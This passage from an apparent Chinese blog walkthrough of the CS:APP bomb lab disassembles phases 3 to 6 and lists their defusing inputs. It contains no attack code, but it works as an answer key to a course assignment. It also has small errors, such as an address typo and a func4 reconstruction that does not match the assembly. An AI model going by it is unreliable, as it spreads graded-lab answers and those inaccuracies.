b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x0</span>,%eax</span><br><span class="line">  <span class="number">400f</span>5b:	e8 <span class="number">90</span> fc ff ff       	callq  <span class="number">400b</span>f0 &lt;__isoc99_sscanf@plt&gt;  </span><br></pre></td></tr></table></figure>
<p>在调用<mark class="label default">400bf0 __isoc99_sscanf</mark>之前将%esi赋值为立即数0x4025cf，<mark class="label default">x /s 0x4025cf</mark>查看0x4025cf处的值，为<mark class="label default">"%d %d"</mark>,读入两个整形值。这两个值存放在哪里呢？之前将rsp+0xc与rsp+0x8的值分别给rcx与rdx，推测输入的两个数同样存放在栈中。<br>为了验证这一推测，<mark class="label default">break *0x400f60</mark>设置断点，<mark class="label default">x/8xd $rsp</mark>查看rsp开始6字节的内容，如下所示</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0x7ffffffee0a8</span>: <span class="number">1</span>       <span class="number">0</span>       <span class="number">0</span>       <span class="number">0</span>       <span class="number">2</span>       <span class="number">0</span>       <span class="number">0</span>       <span class="number">0</span></span><br></pre></td></tr></table></figure>
<p>接下来查看调用输入结束后的汇编代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">400f</span>60:   <span class="number">83</span> f8 <span class="number">01</span>                cmp    $<span class="number">0x1</span>,%eax</span><br><span class="line"><span class="number">400f</span>63:   <span class="number">7f</span> <span class="number">05</span>                   jg     <span class="number">400f</span>6a &lt;phase_3+<span class="number">0x27</span>&gt;</span><br><span class="line"><span class="number">400f</span>65:   e8 d0 <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>          callq  <span class="number">40143</span>a &lt;explode_bomb&gt;</span><br><span class="line"><span class="number">400f</span>6a:   <span class="number">83</span> <span class="number">7</span>c <span class="number">24</span> <span class="number">08</span> <span class="number">07</span>          cmpl   $<span class="number">0x7</span>,<span class="number">0x8</span>(%rsp)</span><br><span class="line"><span class="number">400f</span>6f:   <span class="number">77</span> <span class="number">3</span>c                   ja     <span class="number">400f</span>ad &lt;phase_3+<span class="number">0x6a</span>&gt;</span><br><span class="line"><span class="number">400f</span>71:   <span class="number">8b</span> <span class="number">44</span> <span class="number">24</span> <span class="number">08</span>             mov    <span class="number">0x8</span>(%rsp),%eax</span><br><span class="line"><span class="number">400f</span>75:   ff <span class="number">24</span> c5 <span class="number">70</span> <span class="number">24</span> <span class="number">40</span> <span class="number">00</span>    jmpq   *<span class="number">0x402470</span>(,%rax,<span class="number">8</span>)<span class="comment">//0x402470处存放跳转表</span></span><br><span class="line"><span class="number">400f</span>7c:   b8 cf <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          mov    $<span class="number">0xcf</span>,%eax  <span class="comment">//当第一个数为0时跳转到此处</span></span><br><span class="line"><span class="number">400f</span>81:   eb <span class="number">3b</span>                   jmp    <span class="number">400f</span>be &lt;phase_3+<span class="number">0x7b</span>&gt;</span><br><span class="line"><span class="number">400f</span>83:   b8 c3 <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>          mov    $<span class="number">0x2c3</span>,%eax <span class="comment">//当第一个数为2时跳转到此处</span></span><br><span class="line"><span class="number">400f</span>88:   eb <span class="number">34</span>                   jmp    <span class="number">400f</span>be &lt;phase_3+<span class="number">0x7b</span>&gt;</span><br><span class="line"><span class="number">400f</span>8a:   b8 <span class="number">00</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>          mov    $<span class="number">0x100</span>,%eax <span class="comment">//第一个数为3时跳转到此处</span></span><br><span class="line"><span class="number">400f</span>8f:   eb <span class="number">2</span>d                   jmp    <span class="number">400f</span>be &lt;phase_3+<span class="number">0x7b</span>&gt;</span><br><span class="line"><span class="number">400f</span>91:   b8 <span class="number">85</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>          mov    $<span class="number">0x185</span>,%eax <span class="comment">//第一个数为4时跳转到此处</span></span><br><span class="line"><span class="number">400f</span>96:   eb <span class="number">26</span>                   jmp    <span class="number">400f</span>be &lt;phase_3+<span class="number">0x7b</span>&gt;</span><br><span class="line"><span class="number">400f</span>98:   b8 ce <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          mov    $<span class="number">0xce</span>,%eax <span class="comment">//第一个数为5时跳转到此处</span></span><br><span class="line"><span class="number">400f</span>9d:   eb <span class="number">1f</span>                   jmp    <span class="number">400f</span>be &lt;phase_3+<span class="number">0x7b</span>&gt;</span><br><span class="line"><span class="number">400f</span>9f:   b8 aa <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>          mov    $<span class="number">0x2aa</span>,%eax <span class="comment">//第一个数为6时跳转到此处</span></span><br><span class="line"><span class="number">400f</span>a4:   eb <span class="number">18</span>                   jmp    <span class="number">400f</span>be &lt;phase_3+<span class="number">0x7b</span>&gt;</span><br><span class="line"><span class="number">400f</span>a6:   b8 <span class="number">47</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>          mov    $<span class="number">0x147</span>,%eax</span><br><span class="line"><span class="number">400f</span>ab:   eb <span class="number">11</span>                   jmp    <span class="number">400f</span>be &lt;phase_3+<span class="number">0x7b</span>&gt;</span><br><span class="line"><span class="number">400f</span>ad:   e8 <span class="number">88</span> <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>          callq  <span class="number">40143</span>a &lt;explode_bomb&gt;</span><br><span class="line"><span class="number">400f</span>b2:   b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          mov    $<span class="number">0x0</span>,%eax</span><br><span class="line"><span class="number">400f</span>b7:   eb <span class="number">05</span>                   jmp    <span class="number">400f</span>be &lt;phase_3+<span class="number">0x7b</span>&gt;</span><br><span class="line"><span class="number">400f</span>b9:   b8 <span class="number">37</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>          mov    $<span class="number">0x137</span>,%eax <span class="comment">//当第一个数为1时跳转到此处</span></span><br><span class="line"><span class="number">400f</span>be:   <span class="number">3b</span> <span class="number">44</span> <span class="number">24</span> <span class="number">0</span>c             cmp    <span class="number">0xc</span>(%rsp),%eax</span><br><span class="line"><span class="number">400f</span>c2:   <span class="number">74</span> <span class="number">05</span>                   je     <span class="number">400f</span>c9 &lt;phase_3+<span class="number">0x86</span>&gt;</span><br><span class="line"><span class="number">400f</span>c4:   e8 <span class="number">71</span> <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>          callq  <span class="number">40143</span>a &lt;explode_bomb&gt;</span><br><span class="line"><span class="number">400f</span>c9:   <span class="number">48</span> <span class="number">83</span> c4 <span class="number">18</span>             add    $<span class="number">0x18</span>,%rsp</span><br><span class="line"><span class="number">400f</span>cd:   c3                      retq </span><br></pre></td></tr></table></figure>
<p>rsp+0x8中存放的值复制入eax，然后进行一个跳转，跳转到的地址为<code>0x402470(,%rax,8)</code>，这就是一个典型的switch语句的实现，根据跳转表跳转至相应位置，将对应的立即数赋值给eax，然后再将eax的值与第二个数比较，若不等则引爆炸弹。<br>全部解如下所示：</p>
<table>
<thead>
<tr>
<th align="center">第一个数</th>
<th align="center">第二个数</th>
</tr>
</thead>
<tbody><tr>
<td align="center">0</td>
<td align="center">0xcf=207</td>
</tr>
<tr>
<td align="center">1</td>
<td align="center">0x137=311</td>
</tr>
<tr>
<td align="center">2</td>
<td align="center">0x2c3=707</td>
</tr>
<tr>
<td align="center">3</td>
<td align="center">0x100=256</td>
</tr>
<tr>
<td align="center">4</td>
<td align="center">0x185=389</td>
</tr>
<tr>
<td align="center">5</td>
<td align="center">0xce=206</td>
</tr>
<tr>
<td align="center">6</td>
<td align="center">0x2aa=682</td>
</tr>
</tbody></table>
<h1 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h1><p>phase_4汇编代码如下所示：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">000000000040100</span>c &lt;phase_4&gt;:</span><br><span class="line">  <span class="number">40100</span>c:	<span class="number">48</span> <span class="number">83</span> ec <span class="number">18</span>          	sub    $<span class="number">0x18</span>,%rsp</span><br><span class="line">  <span class="number">401010</span>:	<span class="number">48</span> <span class="number">8</span>d <span class="number">4</span>c <span class="number">24</span> <span class="number">0</span>c       	lea    <span class="number">0xc</span>(%rsp),%rcx</span><br><span class="line">  <span class="number">401015</span>:	<span class="number">48</span> <span class="number">8</span>d <span class="number">54</span> <span class="number">24</span> <span class="number">08</span>       	lea    <span class="number">0x8</span>(%rsp),%rdx</span><br><span class="line">  <span class="number">40101</span>a:	be cf <span class="number">25</span> <span class="number">40</span> <span class="number">00</span>       	mov    $<span class="number">0x4025cf</span>,%esi</span><br><span class="line">  <span class="number">40101f</span>:	b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x0</span>,%eax</span><br><span class="line">  <span class="number">401024</span>:	e8 c7 fb ff ff       	callq  <span class="number">400b</span>f0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  <span class="number">401029</span>:	<span class="number">83</span> f8 <span class="number">02</span>             	cmp    $<span class="number">0x2</span>,%eax</span><br><span class="line">  <span class="number">40102</span>c:	<span class="number">75</span> <span class="number">07</span>                	jne    <span class="number">401035</span> &lt;phase_4+<span class="number">0x29</span>&gt;</span><br><span class="line">  <span class="number">40102</span>e:	<span class="number">83</span> <span class="number">7</span>c <span class="number">24</span> <span class="number">08</span> <span class="number">0</span>e       	cmpl   $<span class="number">0xe</span>,<span class="number">0x8</span>(%rsp)</span><br><span class="line">  <span class="number">401033</span>:	<span class="number">76</span> <span class="number">05</span>                	jbe    <span class="number">40103</span>a &lt;phase_4+<span class="number">0x2e</span>&gt;</span><br><span class="line">  <span class="number">401035</span>:	e8 <span class="number">00</span> <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>       	callq  <span class="number">40143</span>a &lt;explode_bomb&gt;</span><br><span class="line">  <span class="number">40103</span>a:	ba <span class="number">0</span>e <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0xe</span>,%edx</span><br><span class="line">  <span class="number">40103f</span>:	be <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x0</span>,%esi</span><br><span class="line">  <span class="number">401044</span>:	<span class="number">8b</span> <span class="number">7</span>c <span class="number">24</span> <span class="number">08</span>          	mov    <span class="number">0x8</span>(%rsp),%edi</span><br><span class="line">  <span class="number">401048</span>:	e8 <span class="number">81</span> ff ff ff       	callq  <span class="number">400f</span>ce &lt;func4&gt;</span><br><span class="line">  <span class="number">40104</span>d:	<span class="number">85</span> c0                	test   %eax,%eax</span><br><span class="line">  <span class="number">40104f</span>:	<span class="number">75</span> <span class="number">07</span>                	jne    <span class="number">401058</span> &lt;phase_4+<span class="number">0x4c</span>&gt;</span><br><span class="line">  <span class="number">401051</span>:	<span class="number">83</span> <span class="number">7</span>c <span class="number">24</span> <span class="number">0</span>c <span class="number">00</span>       	cmpl   $<span class="number">0x0</span>,<span class="number">0xc</span>(%rsp)</span><br><span class="line">  <span class="number">401056</span>:	<span class="number">74</span> <span class="number">05</span>                	je     <span class="number">40105</span>d &lt;phase_4+<span class="number">0x51</span>&gt;</span><br><span class="line">  <span class="number">401058</span>:	e8 dd <span class="number">03</span> <span class="number">00</span> <span class="number">00</span>       	callq  <span class="number">40143</span>a &lt;explode_bomb&gt;</span><br><span class="line">  <span class="number">40105</span>d:	<span class="number">48</span> <span class="number">83</span> c4 <span class="number">18</span>          	add    $<span class="number">0x18</span>,%rsp</span><br><span class="line">  <span class="number">401061</span>:	c3                   	retq   </span><br></pre></td></tr></table></figure>
<p>在调用<code>func4</code>后将返回值是否为0，验证第二个数是否为0，由此可知第二个数一定为0，在执行func4后确保返回值一定为0，接下来分析<code>func4</code>部分的汇编代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0000000000400f</span>ce &lt;func4&gt;:</span><br><span class="line">  <span class="number">400f</span>ce:	<span class="number">48</span> <span class="number">83</span> ec <span class="number">08</span>          	sub    $<span class="number">0x8</span>,%rsp</span><br><span class="line">  <span class="number">400f</span>d2:	<span class="number">89</span> d0                	mov    %edx,%eax</span><br><span class="line">  <span class="number">400f</span>d4:	<span class="number">29</span> f0                	sub    %esi,%eax</span><br><span class="line">  <span class="number">400f</span>d6:	<span class="number">89</span> c1                	mov    %eax,%ecx</span><br><span class="line">  <span class="number">400f</span>d8:	c1 e9 <span class="number">1f</span>             	shr    $<span class="number">0x1f</span>,%ecx</span><br><span class="line">  <span class="number">400f</span>db:	<span class="number">01</span> c8                	add    %ecx,%eax</span><br><span class="line">  <span class="number">400f</span>dd:	d1 f8                	sar    %eax</span><br><span class="line">  <span class="number">400f</span>df:	<span class="number">8</span>d <span class="number">0</span>c <span class="number">30</span>             	lea    (%rax,%rsi,<span class="number">1</span>),%ecx</span><br><span class="line">  <span class="number">400f</span>e2:	<span class="number">39</span> f9                	cmp    %edi,%ecx</span><br><span class="line">  <span class="number">400f</span>e4:	<span class="number">7</span>e <span class="number">0</span>c                	jle    <span class="number">400f</span>f2 &lt;func4+<span class="number">0x24</span>&gt;</span><br><span class="line">  <span class="number">400f</span>e6:	<span class="number">8</span>d <span class="number">51</span> ff             	lea    <span class="number">-0x1</span>(%rcx),%edx</span><br><span class="line">  <span class="number">400f</span>e9:	e8 e0 ff ff ff       	callq  <span class="number">400f</span>ce &lt;func4&gt;</span><br><span class="line">  <span class="number">400f</span>ee:	<span class="number">01</span> c0                	add    %eax,%eax</span><br><span class="line">  <span class="number">400f</span>f0:	eb <span class="number">15</span>                	jmp    <span class="number">401007</span> &lt;func4+<span class="number">0x39</span>&gt;</span><br><span class="line">  <span class="number">400f</span>f2:	b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x0</span>,%eax</span><br><span class="line">  <span class="number">400f</span>f7:	<span class="number">39</span> f9                	cmp    %edi,%ecx</span><br><span class="line">  <span class="number">400f</span>f9:	<span class="number">7</span>d <span class="number">0</span>c                	jge    <span class="number">401007</span> &lt;func4+<span class="number">0x39</span>&gt;</span><br><span class="line">  <span class="number">400f</span>fb:	<span class="number">8</span>d <span class="number">71</span> <span class="number">01</span>             	lea    <span class="number">0x1</span>(%rcx),%esi</span><br><span class="line">  <span class="number">400f</span>fe:	e8 cb ff ff ff       	callq  <span class="number">400f</span>ce &lt;func4&gt;</span><br><span class="line">  <span class="number">401003</span>:	<span class="number">8</span>d <span class="number">44</span> <span class="number">00</span> <span class="number">01</span>          	lea    <span class="number">0x1</span>(%rax,%rax,<span class="number">1</span>),%eax</span><br><span class="line">  <span class="number">401007</span>:	<span class="number">48</span> <span class="number">83</span> c4 <span class="number">08</span>          	add    $<span class="number">0x8</span>,%rsp</span><br><span class="line">  <span class="number">40100b</span>:	c3                   	retq  </span><br></pre></td></tr></table></figure>
<p>将其转换为c语言代码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func4</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> z)</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">//x in %rdi,y in %rsi,z in %rdx,t in %rax,k in %ecx</span></span><br><span class="line"> <span class="comment">//y的初始值为0，z的初始值为14</span></span><br><span class="line">  <span class="keyword">int</span> t=z-y;</span><br><span class="line">  <span class="keyword">int</span> k=t&gt;&gt;<span class="number">31</span>;</span><br><span class="line">  t=(t+k)&gt;&gt;<span class="number">1</span>;</span><br><span class="line">  k=t+y;</span><br><span class="line">  <span class="keyword">if</span>(k==x) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span>(k&gt;x)</span><br><span class="line">  &#123;</span><br><span class="line">    z=k<span class="number">-1</span>;</span><br><span class="line">    func4(x,y,z);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span>*t;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(k&lt;x)</span><br><span class="line">  &#123;</span><br><span class="line">	y=k+<span class="number">1</span>;</span><br><span class="line">	func4(x,y,z);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">2</span>*t+<span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>要求最后得到的t为0，则x可以取为0，1，3，7</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">0xe</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(func4(i,<span class="number">0</span>,<span class="number">0xe</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,i);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h1><p>phase_5的汇编代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0000000000401062</span> &lt;phase_5&gt;:</span><br><span class="line">  <span class="number">401062</span>:	<span class="number">53</span>                   	push   %rbx</span><br><span class="line">  <span class="number">401063</span>:	<span class="number">48</span> <span class="number">83</span> ec <span class="number">20</span>          	sub    $<span class="number">0x20</span>,%rsp</span><br><span class="line">  <span class="number">401067</span>:	<span class="number">48</span> <span class="number">89</span> fb             	mov    %rdi,%rbx</span><br><span class="line">  <span class="number">40106</span>a:	<span class="number">64</span> <span class="number">48</span> <span class="number">8b</span> <span class="number">04</span> <span class="number">25</span> <span class="number">28</span> <span class="number">00</span> 	mov    %fs:<span class="number">0x28</span>,%rax</span><br><span class="line">  <span class="number">401071</span>:	<span class="number">00</span> <span class="number">00</span> </span><br><span class="line">  <span class="number">401073</span>:	<span class="number">48</span> <span class="number">89</span> <span class="number">44</span> <span class="number">24</span> <span class="number">18</span>       	mov    %rax,<span class="number">0x18</span>(%rsp)</span><br></pre></td></tr></table></figure>
<p>把输入的地址rdi赋值给rbx,之后的操作防止栈溢出，设置金丝雀值。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">401078</span>:	<span class="number">31</span> c0                	<span class="keyword">xor</span>    %eax,%eax</span><br><span class="line"><span class="number">40107</span>a:	e8 <span class="number">9</span>c <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>       	callq  <span class="number">40131b</span> &lt;string_length&gt;</span><br><span class="line"><span class="number">40107f</span>:	<span class="number">83</span> f8 <span class="number">06</span>             	cmp    $<span class="number">0x6</span>,%eax</span><br><span class="line"><span class="number">401082</span>:	<span class="number">74</span> <span class="number">4</span>e                	je     <span class="number">4010</span>d2 &lt;phase_5+<span class="number">0x70</span>&gt;</span><br><span class="line"><span class="number">401084</span>:	e8 b1 <span class="number">03</span> <span class="number">00</span> <span class="number">00</span>       	callq  <span class="number">40143</span>a &lt;explode_bomb&gt;</span><br></pre></td></tr></table></figure>
<p>第一行清空了eax，之后调用了<code>string_length</code>，返回值是字符串的长度，若不等于6则引爆炸弹。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">4010</span>d2:	b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x0</span>,%eax</span><br><span class="line"><span class="number">4010</span>d7:	eb b2                	jmp    <span class="number">40108b</span> &lt;phase_5+<span class="number">0x29</span>&gt;</span><br></pre></td></tr></table></figure>
<p>将eax置为0后跳转至<code>40108b</code>处</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">40108b</span>:	<span class="number">0f</span> b6 <span class="number">0</span>c <span class="number">03</span>          	movzbl (%rbx,%rax,<span class="number">1</span>),%ecx</span><br><span class="line"><span class="number">40108f</span>:	<span class="number">88</span> <span class="number">0</span>c <span class="number">24</span>             	mov    %cl,(%rsp)</span><br><span class="line"><span class="number">401092</span>:	<span class="number">48</span> <span class="number">8b</span> <span class="number">14</span> <span class="number">24</span>          	mov    (%rsp),%rdx</span><br><span class="line"><span class="number">401096</span>:	<span class="number">83</span> e2 <span class="number">0f</span>             	<span class="keyword">and</span>    $<span class="number">0xf</span>,%edx</span><br><span class="line"><span class="number">401099</span>:	<span class="number">0f</span> b6 <span class="number">92</span> b0 <span class="number">24</span> <span class="number">40</span> <span class="number">00</span> 	movzbl <span class="number">0x4024b0</span>(%rdx),%edx</span><br><span class="line"><span class="number">4010</span>a0:	<span class="number">88</span> <span class="number">54</span> <span class="number">04</span> <span class="number">10</span>          	mov    %dl,<span class="number">0x10</span>(%rsp,%rax,<span class="number">1</span>)</span><br><span class="line"><span class="number">4010</span>a4:	<span class="number">48</span> <span class="number">83</span> c0 <span class="number">01</span>          	add    $<span class="number">0x1</span>,%rax</span><br><span class="line"><span class="number">4010</span>a8:	<span class="number">48</span> <span class="number">83</span> f8 <span class="number">06</span>          	cmp    $<span class="number">0x6</span>,%rax</span><br><span class="line"><span class="number">4010</span>ac:	<span class="number">75</span> dd                	jne    <span class="number">40108b</span> &lt;phase_5+<span class="number">0x29</span>&gt;</span><br></pre></td></tr></table></figure>
<p>movzbl命令将从rbx（输入）开始的rax位置的一个字节赋给ecx的低16位。接下来的两行先把cl中的值（ecx的低八位）复制到rsp处，再将rsp中的值复制到rdx中，再使用掩码0xf取edx的低4位。上述操作即为：取读入的字符串中rax位置处的字符，再取它的低4位放在edx中。<br>将地址0x4024b0+rdx中的一个字节放入edx的低16位中，并将这16位复制到了rsp+0x10+rax的位置中。<br>循环一共进行了6次，分别读取了输入的6个字符，记录这个6个字符的低6位作为索引rdx，从0x4024b0+rdx的位置复制一个字节到rsp+0x10开始的6字节中。结束之后，rsp+0x10之后的位置存放了6个字符。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4010ae:	c6 44 24 16 00       	movb   $0x0,0x16(%rsp)</span><br></pre></td></tr></table></figure>
<p>在rsp+0x16的位置也就是6个字符之后置上一个0x0也就是终止符\0。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">4010b</span>3:	be <span class="number">5</span>e <span class="number">24</span> <span class="number">40</span> <span class="number">00</span>       	mov    $<span class="number">0x40245e</span>,%esi</span><br><span class="line"><span class="number">4010b</span>8:	<span class="number">48</span> <span class="number">8</span>d <span class="number">7</span>c <span class="number">24</span> <span class="number">10</span>       	lea    <span class="number">0x10</span>(%rsp),%rdi</span><br><span class="line"><span class="number">4010b</span>d:	e8 <span class="number">76</span> <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>       	callq  <span class="number">401338</span> &lt;strings_not_equal&gt;</span><br><span class="line"><span class="number">4010</span>c2:	<span class="number">85</span> c0                	test   %eax,%eax</span><br><span class="line"><span class="number">4010</span>c4:	<span class="number">74</span> <span class="number">13</span>                	je     <span class="number">4010</span>d9 &lt;phase_5+<span class="number">0x77</span>&gt;</span><br><span class="line"><span class="number">4010</span>c6:	e8 <span class="number">6f</span> <span class="number">03</span> <span class="number">00</span> <span class="number">00</span>       	callq  <span class="number">40143</span>a &lt;explode_bomb&gt;</span><br></pre></td></tr></table></figure>
<p>将<code>0x40245e</code>这个地址赋给esi，把rsp+0x10这个地址赋给rdi，接下来调用strings_not_equal这个函数，esi与rdi即为要比较的两个字符串的首地址，如果两个字符串不相同就引爆炸弹。<br><code>x/s 0x40245e</code>查看<code>0x402465e</code>处的字符串，这就是我们应该从之前的字符串中取出并且放在rsp+0x10处的字符串</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0x40245e</span>:       <span class="string">&quot;flyers&quot;</span></span><br></pre></td></tr></table></figure>
<p><code>x/s 0x4024b0</code>查看之前的字符串</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0x4024b0</span> &lt;<span class="built_in">array</span><span class="number">.3449</span>&gt;:  <span class="string">&quot;maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?&quot;</span></span><br></pre></td></tr></table></figure>
<p>需要的字符flyers的索引分别为9 15 14 5 6 7。这个索引就是我们输入的字符的低4位，那我们只要找到低4位分别是以上数值的字符就可以了。查阿斯克码表得到一个答案为<mark class="label default">ionefg</mark></p>
<h1 id="phase-6"><a href="#phase-6" class="headerlink" title="phase_6"></a>phase_6</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00000000004010f</span>4 &lt;phase_6&gt;:</span><br><span class="line">  <span class="number">4010f</span>4:	<span class="number">41</span> <span class="number">56</span>                	push   %r14</span><br><span class="line">  <span class="number">4010f</span>6:	<span class="number">41</span> <span class="number">55</span>                	push   %r13</span><br><span class="line">  <span class="number">4010f</span>8:	<span class="number">41</span> <span class="number">54</span>                	push   %r12</span><br><span class="line">  <span class="number">4010f</span>a:	<span class="number">55</span>                   	push   %rbp</span><br><span class="line">  <span class="number">4010f</span>b:	<span class="number">53</span>                   	push   %rbx</span><br><span class="line">  <span class="number">4010f</span>c:	<span class="number">48</span> <span class="number">83</span> ec <span class="number">50</span>          	sub    $<span class="number">0x50</span>,%rsp</span><br><span class="line">  <span class="number">401100</span>:	<span class="number">49</span> <span class="number">89</span> e5             	mov    %rsp,%r13</span><br><span class="line">  <span class="number">401103</span>:	<span class="number">48</span> <span class="number">89</span> e6             	mov    %rsp,%rsi</span><br><span class="line">  <span class="number">401106</span>:	e8 <span class="number">51</span> <span class="number">03</span> <span class="number">00</span> <span class="number">00</span>       	callq  <span class="number">40145</span>c &lt;read_six_numbers&gt;</span><br></pre></td></tr></table></figure>
<p>与之前类似，同样读入6个数字，存入栈中。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">40110b</span>:	<span class="number">49</span> <span class="number">89</span> e6             	mov    %rsp,%r14</span><br><span class="line"> <span class="number">40110</span>e:	<span class="number">41</span> bc <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    	mov    $<span class="number">0x0</span>,%r12d</span><br><span class="line"> <span class="number">401114</span>:	<span class="number">4</span>c <span class="number">89</span> ed             	mov    %r13,%rbp</span><br><span class="line"> <span class="number">401117</span>:	<span class="number">41</span> <span class="number">8b</span> <span class="number">45</span> <span class="number">00</span>          	mov    <span class="number">0x0</span>(%r13),%eax</span><br><span class="line"> <span class="number">40111b</span>:	<span class="number">83</span> e8 <span class="number">01</span>             	sub    $<span class="number">0x1</span>,%eax</span><br><span class="line"> <span class="number">40111</span>e:	<span class="number">83</span> f8 <span class="number">05</span>             	cmp    $<span class="number">0x5</span>,%eax</span><br><span class="line"> <span class="number">401121</span>:	<span class="number">76</span> <span class="number">05</span>                	jbe    <span class="number">401128</span> &lt;phase_6+<span class="number">0x34</span>&gt;</span><br><span class="line"> <span class="number">401123</span>:	e8 <span class="number">12</span> <span class="number">03</span> <span class="number">00</span> <span class="number">00</span>       	callq  <span class="number">40143</span>a &lt;explode_bomb&gt;</span><br><span class="line"> <span class="number">401128</span>:	<span class="number">41</span> <span class="number">83</span> c4 <span class="number">01</span>          	add    $<span class="number">0x1</span>,%r12d</span><br><span class="line"> <span class="number">40112</span>c:	<span class="number">41</span> <span class="number">83</span> fc <span class="number">06</span>          	cmp    $<span class="number">0x6</span>,%r12d</span><br><span class="line"> <span class="number">401130</span>:	<span class="number">74</span> <span class="number">21</span>                	je     <span class="number">401153</span> &lt;phase_6+<span class="number">0x5f</span>&gt;</span><br><span class="line"> <span class="number">401132</span>:	<span class="number">44</span> <span class="number">89</span> e3             	mov    %r12d,%ebx</span><br><span class="line"> <span class="number">401135</span>:	<span class="number">48</span> <span class="number">63</span> c3             	movslq %ebx,%rax</span><br><span class="line"> <span class="number">401138</span>:	<span class="number">8b</span> <span class="number">04</span> <span class="number">84</span>             	mov    (%rsp,%rax,<span class="number">4</span>),%eax</span><br><span class="line"> <span class="number">40113b</span>:	<span class="number">39</span> <span class="number">45</span> <span class="number">00</span>             	cmp    %eax,<span class="number">0x0</span>(%rbp)</span><br><span class="line"> <span class="number">40113</span>e:	<span class="number">75</span> <span class="number">05</span>                	jne    <span class="number">401145</span> &lt;phase_6+<span class="number">0x51</span>&gt;</span><br><span class="line"> <span class="number">401140</span>:	e8 f5 <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>       	callq  <span class="number">40143</span>a &lt;explode_bomb&gt;</span><br><span class="line"> <span class="number">401145</span>:	<span class="number">83</span> c3 <span class="number">01</span>             	add    $<span class="number">0x1</span>,%ebx</span><br><span class="line"> <span class="number">401148</span>:	<span class="number">83</span> fb <span class="number">05</span>             	cmp    $<span class="number">0x5</span>,%ebx</span><br><span class="line"> <span class="number">40114b</span>:	<span class="number">7</span>e e8                	jle    <span class="number">401135</span> &lt;phase_6+<span class="number">0x41</span>&gt;</span><br><span class="line"> <span class="number">40114</span>d:	<span class="number">49</span> <span class="number">83</span> c5 <span class="number">04</span>          	add    $<span class="number">0x4</span>,%r13</span><br><span class="line"> <span class="number">401151</span>:	eb c1                	jmp    <span class="number">401114</span> &lt;phase_6+<span class="number">0x20</span>&gt;</span><br></pre></td></tr></table></figure>
